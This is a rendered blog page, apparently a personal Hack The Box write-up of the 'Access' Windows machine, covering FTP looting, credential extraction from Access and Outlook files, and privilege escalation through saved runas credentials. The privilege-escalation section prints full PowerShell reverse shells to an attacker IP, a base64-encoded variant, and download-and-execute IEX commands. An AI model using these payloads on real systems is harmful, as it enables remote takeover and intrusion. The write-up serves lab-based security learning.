@@ -1,0 +1,354 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Access | whoami</title>
+<meta name="keywords" content="">
+<meta name="description" content="Easy Windows">
+<meta name="author" content="">
+<link rel="canonical" href="http://localhost:1313/htb/access-easy-windows/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.cd9298b33628769aa1bc1acebbbfd7aa11ce81dfe03484d479e1907760249a1d.css" integrity="sha256-zZKYszYodpqhvBrOu7/XqhHOgd/gNITUeeGQd2Akmh0=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/htb/access-easy-windows/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .toc {
+                background: var(--entry);
+            }
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script><meta property="og:url" content="http://localhost:1313/htb/access-easy-windows/">
+  <meta property="og:site_name" content="whoami">
+  <meta property="og:title" content="Access">
+  <meta property="og:description" content="Easy Windows">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="htb">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Access">
+  <meta name="twitter:description" content="Easy Windows">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Hack The Box",
+      "item": "http://localhost:1313/htb/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Access",
+      "item": "http://localhost:1313/htb/access-easy-windows/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Access",
+  "name": "Access",
+  "description": "Easy Windows",
+  "keywords": [
+    
+  ],
+  "articleBody": "nmap scan nmap -p- -vv -T4 -Pn --min-rate=1000 -sC website is just a static page searching LON-MC6 does immediately should MS09-042 which seems like a vulnerability in Telnet that could allow RCE And port 23 is open with telnet telnet 10.129.241.188 results in a “Welcome to Microsoft Telnet Service” message and login is required\nlets look at port 21 with ftp open anonymous login is valid\nthere’s a couple files on the ftp server but downloading them, one is a backup.mdb which is a MS Access Database but it seems to not be downloading properly. The other is Access Control.zip which is encrypted\nso lets try to do the telnet vulnerability\nOkay so I peeked at the walkthrough and downloading the files on ftp was correct - I had to change to binary mode to download them properly\nCreate csvs of every table: auth_group so we can see that administrator is a Administrator level account looking at auth_user admin : admin engineer : access4u@security backup_admin : admin credentials did not work with telnet - so maybe it will work for ftp or decrypt zip file the engineer password worked for the zip file 7z x Access\\ Control.zip Got a Access Control.pst file which is a Microsoft Outlook Personal Storage file sudo apt install pst-utils to be able to read in linux\nReading the email security : 4Cc3ssC0ntr0ller\ntry use on telnet user.txt = ab2ab8f61dd197103a7a84665b4b04ff\nDon’t know what im doing with priv esc so pausing here and going to watch/read some priv esc stuff\nRunning cmdkey /list More on info on the hacktricks windows priv esc page Windows Vault stores credentials that Windows can log in the users automatically, which means that any Windows application that needs credentials to access a resource (server or a website) can make use of this Credential Manager \u0026 Windows Vault and use the credentials supplied instead of users entering the username and password all the time.\npowershell -NoProfile -NonInteractive -Command \"$client = New-Object System.Net.Sockets.TCPClient('10.10.16.196',4444); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) { $data = (New-Object System.Text.ASCIIEncoding).GetString($bytes,0,$i); $sendback = (iex $data 2\u003e\u00261 | Out-String); $sendback2 = $sendback + 'PS ' + (pwd).Path + '\u003e '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush() }; $client.Close()\" Powershell\nrunas opens a new window so can’t really be used to just run cmd.exe for us\n# Enumerate through all *.lnk files (which are shortcut files) on the system and examine them for the runas command Get-ChildItem \"C:\\\" *.lnk -Recurse -Force | ft fullname | Out-File shortcuts.txt # shortcuts.txt has paths to all .lnk files, now we look for runas in the file ForEach($file in gc .\\shortcuts.txt) { Write-Output $file; gc $file | Select-String runas } It can be seen that ZKTeco\\ZKAccess3.5\\Access.exe is being run with the saved creds using runas\nrunas /savecred /user:ACCESS\\Administrator \"powershell -NoProfile -NonInteractive -Command \"$client = New-Object System.Net.Sockets.TCPClient('10.10.16.196',1234); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) { $data = (New-Object System.Text.ASCIIEncoding).GetString($bytes,0,$i); $sendback = (iex $data 2\u003e\u00261 | Out-String); $sendback2 = $sendback + 'PS ' + (pwd).Path + '\u003e '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush() }; $client.Close()\"\" runas /user:ACCESS\\Administrator /savecred \"powershell -NoProfile -NonInteractive -EncodedCommand IiRjbGllbnQgPSBOZXctT2JqZWN0IFN5c3RlbS5OZXQuU29ja2V0cy5UQ1BDbGllbnQoJzEwLjEwLjE2LjE5NicsMTIzNCk7ICRzdHJlYW0gPSAkY2xpZW50LkdldFN0cmVhbSgpOyBbYnl0ZVtdXSRieXRlcyA9IDAuLjY1NTM1fCV7MH07IHdoaWxlKCgkaSA9ICRzdHJlYW0uUmVhZCgkYnl0ZXMsIDAsICRieXRlcy5MZW5ndGgpKSAtbmUgMCkgeyAkZGF0YSA9IChOZXctT2JqZWN0IFN5c3RlbS5UZXh0LkFTQ0lJRW5jb2RpbmcpLkdldFN0cmluZygkYnl0ZXMsMCwkaSk7ICRzZW5kYmFjayA9IChpZXggJGRhdGEgMj4mMSB8IE91dC1TdHJpbmcpOyAkc2VuZGJhY2syID0gJHNlbmRiYWNrICsgJ1BTICcgKyAocHdkKS5QYXRoICsgJz4gJzsgJHNlbmRieXRlID0gKFt0ZXh0LmVuY29kaW5nXTo6QVNDSUkpLkdldEJ5dGVzKCRzZW5kYmFjazIpOyAkc3RyZWFtLldyaXRlKCRzZW5kYnl0ZSwwLCRzZW5kYnl0ZS5MZW5ndGgpOyAkc3RyZWFtLkZsdXNoKCkgfTsgJGNsaWVudC5DbG9zZSgpIgo=\" powershell -NoProfile -NonInteractive -Command \"$client = New-Object System.Net.Sockets.TCPClient('10.10.16.196',1234); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) { $data = (New-Object System.Text.ASCIIEncoding).GetString($bytes,0,$i); $sendback = (iex $data 2\u003e\u00261 | Out-String); $sendback2 = $sendback + 'PS ' + (pwd).Path + '\u003e '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush() }; $client.Close()\" runas /user:ACCESS\\Administrator /savecred \"powershell -c IEX (New-Object Net.Webclient).downloadstring('http://10.10.14.2:8080/admin.ps1')\" This shit aint working, im going through the walkthrough\n$client = New-Object System.Net.Sockets.TCPClient('10.10.16.196',1234); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) { $data = (New-Object System.Text.ASCIIEncoding).GetString($bytes,0,$i); $sendback = (iex $data 2\u003e\u00261 | Out-String); $sendback2 = $sendback + 'PS ' + (pwd).Path + '\u003e '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush() }; $client.Close() put the payload into a file ‘admin.ps1’ and serve it\nUse\nrunas /user:ACCESS\\Administrator /savecred \"powershell -c IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.196/admin.ps1')\" runas /user:ACCESS\\Administrator /savecred: Runs a command as another user (in this case, Administrator) using saved credentials. If the credentials were previously entered and saved, it won’t prompt again. powershell -c IEX (...): Executes a PowerShell command that downloads and runs a remote script (admin.ps1) from your attacking machine. IEX (Invoke-Expression): Executes the string returned by DownloadString, which is your reverse shell payload. ",
+  "wordCount" : "722",
+  "inLanguage": "en",
+  "datePublished": "0001-01-01T00:00:00Z",
+  "dateModified": "0001-01-01T00:00:00Z",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "http://localhost:1313/htb/access-easy-windows/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "whoami",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "http://localhost:1313/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="header-nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="whoami (Alt + H)">whoami</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" class="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg class="moon" xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg class="sun" xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu" class="menu">
+            <li>
+                <a href="http://localhost:1313/posts/" title="Posts">
+                    <span>Posts</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/projects/" title="Projects">
+                    <span>Projects</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/htb/" title="HTB">
+                    <span>HTB</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      Access
+    </h1>
+    <div class="post-description">
+      Easy Windows
+    </div>
+  </header> 
+  <div class="post-content md-content"><p>nmap scan
+<code>nmap  -p- -vv -T4 -Pn --min-rate=1000 -sC</code>
+<img alt="Access (Easy Windows).png" loading="lazy" src="/htb/access-easy-windows/Access%20%28Easy%20Windows%29.png">
+website is just a static page
+<img alt="Access (Easy Windows)-1.png" loading="lazy" src="/htb/access-easy-windows/Access%20%28Easy%20Windows%29-1.png">
+searching LON-MC6 does immediately should MS09-042 which seems like a vulnerability in Telnet that could allow RCE
+And port 23 is open with telnet
+<code>telnet 10.129.241.188</code>
+results in a &ldquo;Welcome to Microsoft Telnet Service&rdquo; message and login is required</p>
+<p>lets look at port 21 with ftp open
+anonymous login is valid</p>
+<p>there&rsquo;s a couple files on the ftp server but downloading them, one is a backup.mdb which is a MS Access Database but it seems to not be downloading properly. The other is Access Control.zip which is encrypted</p>
+<p>so lets try to do the telnet vulnerability</p>
+<p>Okay so I peeked at the walkthrough and downloading the files on ftp was correct - I had to change to binary mode to download them properly</p>
+<p><img alt="Access (Easy Windows)-2.png" loading="lazy" src="/htb/access-easy-windows/Access%20%28Easy%20Windows%29-2.png">
+Create csvs of every table:
+<img alt="Access (Easy Windows)-3.png" loading="lazy" src="/htb/access-easy-windows/Access%20%28Easy%20Windows%29-3.png">
+auth_group
+<img alt="Access (Easy Windows)-4.png" loading="lazy" src="/htb/access-easy-windows/Access%20%28Easy%20Windows%29-4.png">
+so we can see that <code>administrator</code> is a Administrator level account
+looking at auth_user
+<img alt="Access (Easy Windows)-5.png" loading="lazy" src="/htb/access-easy-windows/Access%20%28Easy%20Windows%29-5.png">
+<code>admin</code> : <code>admin</code>
+<code>engineer</code> : <code>access4u@security</code>
+<code>backup_admin</code> : <code>admin</code>
+<img alt="Access (Easy Windows)-6.png" loading="lazy" src="/htb/access-easy-windows/Access%20%28Easy%20Windows%29-6.png">
+credentials did not work with telnet - so maybe it will work for ftp or decrypt zip file
+the engineer password worked for the zip file
+<code>7z x Access\ Control.zip</code>
+Got a Access Control.pst file which is a Microsoft Outlook Personal Storage file
+<code>sudo apt install pst-utils</code> to be able to read in linux</p>
+<p>Reading the email
+<img alt="Access (Easy Windows)-7.png" loading="lazy" src="/htb/access-easy-windows/Access%20%28Easy%20Windows%29-7.png">
+<code>security</code> : <code>4Cc3ssC0ntr0ller</code></p>
+<p>try use on telnet
+<img alt="Access (Easy Windows)-8.png" loading="lazy" src="/htb/access-easy-windows/Access%20%28Easy%20Windows%29-8.png"></p>
+<p>user.txt = ab2ab8f61dd197103a7a84665b4b04ff</p>
+<p>Don&rsquo;t know what im doing with priv esc so pausing here and going to watch/read some priv esc stuff</p>
+<p><img alt="Access (Easy Windows)-9.png" loading="lazy" src="/htb/access-easy-windows/Access%20%28Easy%20Windows%29-9.png"></p>
+<p>Running <code>cmdkey /list</code>
+<img alt="Access (Easy Windows)-10.png" loading="lazy" src="/htb/access-easy-windows/Access%20%28Easy%20Windows%29-10.png">
+More on info on the hacktricks windows priv esc page
+Windows Vault stores credentials that Windows can log in the users automatically, which means that any <strong>Windows application that needs credentials to access a resource</strong> (server or a website) <strong>can make use of this Credential Manager</strong> &amp; Windows Vault and use the credentials supplied instead of users entering the username and password all the time.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">powershell</span> <span class="n">-NoProfile</span> <span class="n">-NonInteractive</span> <span class="n">-Command</span> <span class="s2">&#34;</span><span class="nv">$client</span><span class="s2"> = New-Object System.Net.Sockets.TCPClient(&#39;10.10.16.196&#39;,4444); </span><span class="nv">$stream</span><span class="s2"> = </span><span class="nv">$client</span><span class="s2">.GetStream(); [byte[]]</span><span class="nv">$bytes</span><span class="s2"> = 0..65535|%{0}; while((</span><span class="nv">$i</span><span class="s2"> = </span><span class="nv">$stream</span><span class="s2">.Read(</span><span class="nv">$bytes</span><span class="s2">, 0, </span><span class="nv">$bytes</span><span class="s2">.Length)) -ne 0) { </span><span class="nv">$data</span><span class="s2"> = (New-Object System.Text.ASCIIEncoding).GetString(</span><span class="nv">$bytes</span><span class="s2">,0,</span><span class="nv">$i</span><span class="s2">); </span><span class="nv">$sendback</span><span class="s2"> = (iex </span><span class="nv">$data</span><span class="s2"> 2&gt;&amp;1 | Out-String); </span><span class="nv">$sendback2</span><span class="s2"> = </span><span class="nv">$sendback</span><span class="s2"> + &#39;PS &#39; + (pwd).Path + &#39;&gt; &#39;; </span><span class="nv">$sendbyte</span><span class="s2"> = ([text.encoding]::ASCII).GetBytes(</span><span class="nv">$sendback2</span><span class="s2">); </span><span class="nv">$stream</span><span class="s2">.Write(</span><span class="nv">$sendbyte</span><span class="s2">,0,</span><span class="nv">$sendbyte</span><span class="s2">.Length); </span><span class="nv">$stream</span><span class="s2">.Flush() }; </span><span class="nv">$client</span><span class="s2">.Close()&#34;</span>
+</span></span></code></pre></div><p>Powershell</p>
+<p><img alt="Access (Easy Windows)-11.png" loading="lazy" src="/htb/access-easy-windows/Access%20%28Easy%20Windows%29-11.png"></p>
+<p>runas opens a new window so can&rsquo;t really be used to just run cmd.exe for us</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># Enumerate through all *.lnk files (which are shortcut files) on the system and examine them for the runas command</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Get-ChildItem</span> <span class="s2">&#34;C:\&#34;</span> <span class="p">*.</span><span class="n">lnk</span> <span class="n">-Recurse</span> <span class="n">-Force</span> <span class="p">|</span> <span class="nb">ft </span><span class="n">fullname</span> <span class="p">|</span> <span class="nb">Out-File</span> <span class="n">shortcuts</span><span class="p">.</span><span class="py">txt</span>
+</span></span><span class="line"><span class="cl"><span class="c"># shortcuts.txt has paths to all .lnk files, now we look for runas in the file</span>
+</span></span><span class="line"><span class="cl"><span class="k">ForEach</span><span class="p">(</span><span class="nv">$file</span> <span class="k">in</span> <span class="nb">gc </span><span class="p">.\</span><span class="n">shortcuts</span><span class="p">.</span><span class="n">txt</span><span class="p">)</span> <span class="p">{</span> <span class="nb">Write-Output</span> <span class="nv">$file</span><span class="p">;</span> <span class="nb">gc </span><span class="nv">$file</span> <span class="p">|</span> <span class="nb">Select-String</span> <span class="n">runas</span> <span class="p">}</span>
+</span></span></code></pre></div><p><img alt="Access (Easy Windows)-12.png" loading="lazy" src="/htb/access-easy-windows/Access%20%28Easy%20Windows%29-12.png"></p>
+<p>It can be seen that ZKTeco\ZKAccess3.5\Access.exe is being run with the saved creds using runas</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">runas</span> <span class="p">/</span><span class="n">savecred</span> <span class="p">/</span><span class="n">user</span><span class="err">:</span><span class="n">ACCESS</span><span class="p">\</span><span class="n">Administrator</span> <span class="s2">&#34;powershell -NoProfile -NonInteractive -Command &#34;</span><span class="nv">$client</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="py">Net</span><span class="p">.</span><span class="py">Sockets</span><span class="p">.</span><span class="py">TCPClient</span><span class="p">(</span><span class="s1">&#39;10.10.16.196&#39;</span><span class="p">,</span><span class="mf">1234</span><span class="p">);</span> <span class="nv">$stream</span> <span class="p">=</span> <span class="nv">$client</span><span class="p">.</span><span class="py">GetStream</span><span class="p">();</span> <span class="p">[</span><span class="no">byte[]</span><span class="p">]</span><span class="nv">$bytes</span> <span class="p">=</span> <span class="mf">0</span><span class="p">.</span><span class="mf">.65535</span><span class="p">|%{</span><span class="mf">0</span><span class="p">};</span> <span class="k">while</span><span class="p">((</span><span class="nv">$i</span> <span class="p">=</span> <span class="nv">$stream</span><span class="p">.</span><span class="py">Read</span><span class="p">(</span><span class="nv">$bytes</span><span class="p">,</span> <span class="mf">0</span><span class="p">,</span> <span class="nv">$bytes</span><span class="p">.</span><span class="n">Length</span><span class="p">))</span> <span class="o">-ne</span> <span class="mf">0</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$data</span> <span class="p">=</span> <span class="p">(</span><span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="py">Text</span><span class="p">.</span><span class="n">ASCIIEncoding</span><span class="p">).</span><span class="py">GetString</span><span class="p">(</span><span class="nv">$bytes</span><span class="p">,</span><span class="mf">0</span><span class="p">,</span><span class="nv">$i</span><span class="p">);</span> <span class="nv">$sendback</span> <span class="p">=</span> <span class="p">(</span><span class="nb">iex </span><span class="nv">$data</span> <span class="mf">2</span><span class="p">&gt;&amp;</span><span class="mf">1</span> <span class="p">|</span> <span class="nb">Out-String</span><span class="p">);</span> <span class="nv">$sendback2</span> <span class="p">=</span> <span class="nv">$sendback</span> <span class="p">+</span> <span class="s1">&#39;PS &#39;</span> <span class="p">+</span> <span class="p">(</span><span class="n">pwd</span><span class="p">).</span><span class="py">Path</span> <span class="p">+</span> <span class="s1">&#39;&gt; &#39;</span><span class="p">;</span> <span class="nv">$sendbyte</span> <span class="p">=</span> <span class="p">([</span><span class="no">text.encoding</span><span class="p">]::</span><span class="n">ASCII</span><span class="p">).</span><span class="py">GetBytes</span><span class="p">(</span><span class="nv">$sendback2</span><span class="p">);</span> <span class="nv">$stream</span><span class="p">.</span><span class="py">Write</span><span class="p">(</span><span class="nv">$sendbyte</span><span class="p">,</span><span class="mf">0</span><span class="p">,</span><span class="nv">$sendbyte</span><span class="p">.</span><span class="n">Length</span><span class="p">);</span> <span class="nv">$stream</span><span class="p">.</span><span class="py">Flush</span><span class="p">()</span> <span class="p">};</span> <span class="nv">$client</span><span class="p">.</span><span class="py">Close</span><span class="p">()</span><span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">runas</span> <span class="p">/</span><span class="n">user</span><span class="err">:</span><span class="n">ACCESS</span><span class="p">\</span><span class="n">Administrator</span> <span class="p">/</span><span class="n">savecred</span> <span class="s2">&#34;powershell -NoProfile -NonInteractive -EncodedCommand IiRjbGllbnQgPSBOZXctT2JqZWN0IFN5c3RlbS5OZXQuU29ja2V0cy5UQ1BDbGllbnQoJzEwLjEwLjE2LjE5NicsMTIzNCk7ICRzdHJlYW0gPSAkY2xpZW50LkdldFN0cmVhbSgpOyBbYnl0ZVtdXSRieXRlcyA9IDAuLjY1NTM1fCV7MH07IHdoaWxlKCgkaSA9ICRzdHJlYW0uUmVhZCgkYnl0ZXMsIDAsICRieXRlcy5MZW5ndGgpKSAtbmUgMCkgeyAkZGF0YSA9IChOZXctT2JqZWN0IFN5c3RlbS5UZXh0LkFTQ0lJRW5jb2RpbmcpLkdldFN0cmluZygkYnl0ZXMsMCwkaSk7ICRzZW5kYmFjayA9IChpZXggJGRhdGEgMj4mMSB8IE91dC1TdHJpbmcpOyAkc2VuZGJhY2syID0gJHNlbmRiYWNrICsgJ1BTICcgKyAocHdkKS5QYXRoICsgJz4gJzsgJHNlbmRieXRlID0gKFt0ZXh0LmVuY29kaW5nXTo6QVNDSUkpLkdldEJ5dGVzKCRzZW5kYmFjazIpOyAkc3RyZWFtLldyaXRlKCRzZW5kYnl0ZSwwLCRzZW5kYnl0ZS5MZW5ndGgpOyAkc3RyZWFtLkZsdXNoKCkgfTsgJGNsaWVudC5DbG9zZSgpIgo=&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">powershell</span> <span class="n">-NoProfile</span> <span class="n">-NonInteractive</span> <span class="n">-Command</span> <span class="s2">&#34;</span><span class="nv">$client</span><span class="s2"> = New-Object System.Net.Sockets.TCPClient(&#39;10.10.16.196&#39;,1234); </span><span class="nv">$stream</span><span class="s2"> = </span><span class="nv">$client</span><span class="s2">.GetStream(); [byte[]]</span><span class="nv">$bytes</span><span class="s2"> = 0..65535|%{0}; while((</span><span class="nv">$i</span><span class="s2"> = </span><span class="nv">$stream</span><span class="s2">.Read(</span><span class="nv">$bytes</span><span class="s2">, 0, </span><span class="nv">$bytes</span><span class="s2">.Length)) -ne 0) { </span><span class="nv">$data</span><span class="s2"> = (New-Object System.Text.ASCIIEncoding).GetString(</span><span class="nv">$bytes</span><span class="s2">,0,</span><span class="nv">$i</span><span class="s2">); </span><span class="nv">$sendback</span><span class="s2"> = (iex </span><span class="nv">$data</span><span class="s2"> 2&gt;&amp;1 | Out-String); </span><span class="nv">$sendback2</span><span class="s2"> = </span><span class="nv">$sendback</span><span class="s2"> + &#39;PS &#39; + (pwd).Path + &#39;&gt; &#39;; </span><span class="nv">$sendbyte</span><span class="s2"> = ([text.encoding]::ASCII).GetBytes(</span><span class="nv">$sendback2</span><span class="s2">); </span><span class="nv">$stream</span><span class="s2">.Write(</span><span class="nv">$sendbyte</span><span class="s2">,0,</span><span class="nv">$sendbyte</span><span class="s2">.Length); </span><span class="nv">$stream</span><span class="s2">.Flush() }; </span><span class="nv">$client</span><span class="s2">.Close()&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">runas</span> <span class="p">/</span><span class="n">user</span><span class="err">:</span><span class="n">ACCESS</span><span class="p">\</span><span class="n">Administrator</span> <span class="p">/</span><span class="n">savecred</span> <span class="s2">&#34;powershell -c IEX (New-Object Net.Webclient).downloadstring(&#39;http://10.10.14.2:8080/admin.ps1&#39;)&#34;</span>
+</span></span></code></pre></div><p>This shit aint working, im going through the walkthrough</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$client</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="py">Net</span><span class="p">.</span><span class="py">Sockets</span><span class="p">.</span><span class="py">TCPClient</span><span class="p">(</span><span class="s1">&#39;10.10.16.196&#39;</span><span class="p">,</span><span class="mf">1234</span><span class="p">);</span> <span class="nv">$stream</span> <span class="p">=</span> <span class="nv">$client</span><span class="p">.</span><span class="py">GetStream</span><span class="p">();</span> <span class="p">[</span><span class="no">byte[]</span><span class="p">]</span><span class="nv">$bytes</span> <span class="p">=</span> <span class="mf">0</span><span class="p">.</span><span class="mf">.65535</span><span class="p">|%{</span><span class="mf">0</span><span class="p">};</span> <span class="k">while</span><span class="p">((</span><span class="nv">$i</span> <span class="p">=</span> <span class="nv">$stream</span><span class="p">.</span><span class="py">Read</span><span class="p">(</span><span class="nv">$bytes</span><span class="p">,</span> <span class="mf">0</span><span class="p">,</span> <span class="nv">$bytes</span><span class="p">.</span><span class="n">Length</span><span class="p">))</span> <span class="o">-ne</span> <span class="mf">0</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$data</span> <span class="p">=</span> <span class="p">(</span><span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="py">Text</span><span class="p">.</span><span class="n">ASCIIEncoding</span><span class="p">).</span><span class="py">GetString</span><span class="p">(</span><span class="nv">$bytes</span><span class="p">,</span><span class="mf">0</span><span class="p">,</span><span class="nv">$i</span><span class="p">);</span> <span class="nv">$sendback</span> <span class="p">=</span> <span class="p">(</span><span class="nb">iex </span><span class="nv">$data</span> <span class="mf">2</span><span class="p">&gt;&amp;</span><span class="mf">1</span> <span class="p">|</span> <span class="nb">Out-String</span><span class="p">);</span> <span class="nv">$sendback2</span> <span class="p">=</span> <span class="nv">$sendback</span> <span class="p">+</span> <span class="s1">&#39;PS &#39;</span> <span class="p">+</span> <span class="p">(</span><span class="n">pwd</span><span class="p">).</span><span class="py">Path</span> <span class="p">+</span> <span class="s1">&#39;&gt; &#39;</span><span class="p">;</span> <span class="nv">$sendbyte</span> <span class="p">=</span> <span class="p">([</span><span class="no">text.encoding</span><span class="p">]::</span><span class="n">ASCII</span><span class="p">).</span><span class="py">GetBytes</span><span class="p">(</span><span class="nv">$sendback2</span><span class="p">);</span> <span class="nv">$stream</span><span class="p">.</span><span class="py">Write</span><span class="p">(</span><span class="nv">$sendbyte</span><span class="p">,</span><span class="mf">0</span><span class="p">,</span><span class="nv">$sendbyte</span><span class="p">.</span><span class="n">Length</span><span class="p">);</span> <span class="nv">$stream</span><span class="p">.</span><span class="py">Flush</span><span class="p">()</span> <span class="p">};</span> <span class="nv">$client</span><span class="p">.</span><span class="py">Close</span><span class="p">()</span>
+</span></span></code></pre></div><p><img alt="Access (Easy Windows)-15.png" loading="lazy" src="/htb/access-easy-windows/Access%20%28Easy%20Windows%29-15.png">
+put the payload into a file &lsquo;admin.ps1&rsquo; and serve it</p>
+<p><img alt="Access (Easy Windows)-13.png" loading="lazy" src="/htb/access-easy-windows/Access%20%28Easy%20Windows%29-13.png">
+Use</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">runas</span> <span class="p">/</span><span class="n">user</span><span class="err">:</span><span class="n">ACCESS</span><span class="p">\</span><span class="n">Administrator</span> <span class="p">/</span><span class="n">savecred</span> <span class="s2">&#34;powershell -c IEX (New-Object Net.WebClient).DownloadString(&#39;http://10.10.16.196/admin.ps1&#39;)&#34;</span>
+</span></span></code></pre></div><ul>
+<li><code>runas /user:ACCESS\Administrator /savecred</code>: Runs a command as another user (in this case, <code>Administrator</code>) using saved credentials. If the credentials were previously entered and saved, it won’t prompt again.</li>
+<li><code>powershell -c IEX (...)</code>: Executes a PowerShell command that downloads and runs a remote script (<code>admin.ps1</code>) from your attacking machine.</li>
